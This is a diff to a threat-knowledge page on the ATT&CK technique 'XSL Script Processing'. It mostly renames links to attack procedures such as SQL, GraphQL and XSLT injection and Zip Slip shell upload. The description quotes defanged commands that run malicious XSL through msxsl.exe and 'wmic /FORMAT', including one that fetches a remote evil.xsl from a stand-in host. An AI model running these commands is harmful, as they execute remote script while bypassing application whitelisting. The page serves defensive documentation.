@@ -10,29 +10,29 @@ tactics:
 - '[[Defense Evasion|TA0005 - Defense Evasion]]'
 - '[[Execution|TA0002 - Execution]]'
 procedures:
-- '[[DB2 Injection - ASCII Value Extraction]]'
-- '[[GraphQL Batching Attacks using finishChannelVerificationMutation]]'
+- '[[DB2-SQL-Injection-ASCII-Value-Extraction]]'
+- '[[Exploit-GraphQL-Batching-Vulnerability-with-finishChannelVerificationMutation]]'
 - '[[GraphQL Edge/Node Data Extraction]]'
-- '[[GraphQL Injection for NOSQL Exploitation]]'
-- '[[GraphQL Projection Data Extraction]]'
-- '[[GraphQL Type Enumeration]]'
+- '[[GraphQL-Injection-for-NoSQL-Exploitation]]'
+- '[[GraphQL-Projection-Data-Extraction]]'
+- '[[GraphQL-Type-Enumeration]]'
 - '[[Hibernate Query Language Injection - Single Quote Escaping]]'
-- '[[Insecure Source Code Management with Bazaar using rip-bzr.pl]]'
-- '[[LaTex Injection Command Execution]]'
-- '[[LaTex Injection - Write File]]'
+- '[[Extract-Source-Code-from-Bazaar-Repository-using-rip-bzr]]'
+- '[[LaTeX-Injection-for-Command-Execution]]'
+- '[[LaTeX-Injection-Write-File]]'
 - '[[Linux - Privilege Escalation via Writable /etc/passwd]]'
-- '[[MYSQL Error Based - NAME_CONST Function Injection]]'
-- '[[MYSQL Injection Exploitation]]'
-- '[[Native .NET XSLT Injection Remote Code Execution]]'
-- '[[Netdoc SSRF via URL Scheme]]'
-- '[[Out Of Band XPATH Injection]]'
+- '[[MySQL-Error-Based-Injection-Using-NAME_CONST]]'
+- '[[Exploit-MySQL-SQL-Injection-Using-Aggregation-Functions]]'
+- '[[Native-DotNET-XSLT-Injection-RCE]]'
+- '[[Netdoc-SSRF-via-URL-Scheme]]'
+- '[[Out-of-Band-XPath-Injection]]'
 - '[[PHP Deserialization with Monolog/RCE1 and Swiftmailer/FW1 Gadgets]]'
-- '[[PostgreSQL XML Data Exfiltration]]'
-- '[[SAML Injection Authentication Bypass]]'
-- '[[SQLite Injection via Remote Command Execution using Attach Database Command]]'
-- '[[XSLT Injection - Remote Code Execution with PHP wrapper]]'
-- '[[XSLT Injection with Remote Code Execution]]'
-- '[[Zip Slip Basic Exploit - Unix Server Shell Upload]]'
+- '[[PostgreSQL-XML-Data-Exfiltration]]'
+- '[[SAML-Injection-Authentication-Bypass]]'
+- '[[SQLite-Injection-for-RCE-via-Attach-Database]]'
+- '[[xslt-injection-for-php-remote-code-execution]]'
+- '[[XSLT-Injection-with-Embedded-C-Sharp-Script-for-RCE]]'
+- '[[Zip-Slip-Exploit-for-PHP-Shell-Upload-on-Unix-Server]]'
 ---
 
 # XSL Script Processing
@@ -42,6 +42,8 @@ procedures:
 ## Description
 
 Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. [1]Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to Trusted Developer Utilities, the Microsoft common line transformation utility binary (msxsl.exe) [2] can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. [3] Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. [4]Command-line example: [3]msxsl.exe customers[.]xml script[.]xslAnother variation of this technique, dubbed "Squiblytwo", involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file. [5] This technique can also execute local/remote scripts and, similar to its Regsvr32/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool.Command-line examples: [5]Local File: wmic process list /FORMAT:evil[.]xslRemote File: wmic os get /FORMAT:"https[:]//example[.]com/evil[.]xsl"
+
+
 
 # Detection
 
@@ -82,25 +84,27 @@ Windows Management Instrumentation and/or msxsl.exe may or may not be used withi
 
 ## Related Procedures (23)
 
-- [[DB2 Injection - ASCII Value Extraction]]
-- [[GraphQL Batching Attacks using finishChannelVerificationMutation]]
+- [[DB2-SQL-Injection-ASCII-Value-Extraction]]
+- [[Exploit-GraphQL-Batching-Vulnerability-with-finishChannelVerificationMutation]]
 - [[GraphQL Edge/Node Data Extraction]]
-- [[GraphQL Injection for NOSQL Exploitation]]
-- [[GraphQL Projection Data Extraction]]
-- [[GraphQL Type Enumeration]]
+- [[GraphQL-Injection-for-NoSQL-Exploitation]]
+- [[GraphQL-Projection-Data-Extraction]]
+- [[GraphQL-Type-Enumeration]]
 - [[Hibernate Query Language Injection - Single Quote Escaping]]
-- [[Insecure Source Code Management with Bazaar using rip-bzr.pl]]
-- [[LaTex Injection Command Execution]]
-- [[LaTex Injection - Write File]]
+- [[Extract-Source-Code-from-Bazaar-Repository-using-rip-bzr]]
+- [[LaTeX-Injection-for-Command-Execution]]
+- [[LaTeX-Injection-Write-File]]
 - [[Linux - Privilege Escalation via Writable /etc/passwd]]
-- [[MYSQL Error Based - NAME_CONST Function Injection]]
-- [[MYSQL Injection Exploitation]]
-- [[Native .NET XSLT Injection Remote Code Execution]]
-- [[Netdoc SSRF via URL Scheme]]
-- [[Out Of Band XPATH Injection]]
+- [[MySQL-Error-Based-Injection-Using-NAME_CONST]]
+- [[Exploit-MySQL-SQL-Injection-Using-Aggregation-Functions]]
+- [[Native-DotNET-XSLT-Injection-RCE]]
+- [[Netdoc-SSRF-via-URL-Scheme]]
+- [[Out-of-Band-XPath-Injection]]
 - [[PHP Deserialization with Monolog/RCE1 and Swiftmailer/FW1 Gadgets]]
-- [[PostgreSQL XML Data Exfiltration]]
-- [[SAML Injection Authentication Bypass]]
-- [[SQLite Injection via Remote Command Execution using Attach Database Command]]
+- [[PostgreSQL-XML-Data-Exfiltration]]
+- [[SAML-Injection-Authentication-Bypass]]
+- [[SQLite-Injection-for-RCE-via-Attach-Database]]
 
 *...and 3 more*
+
+
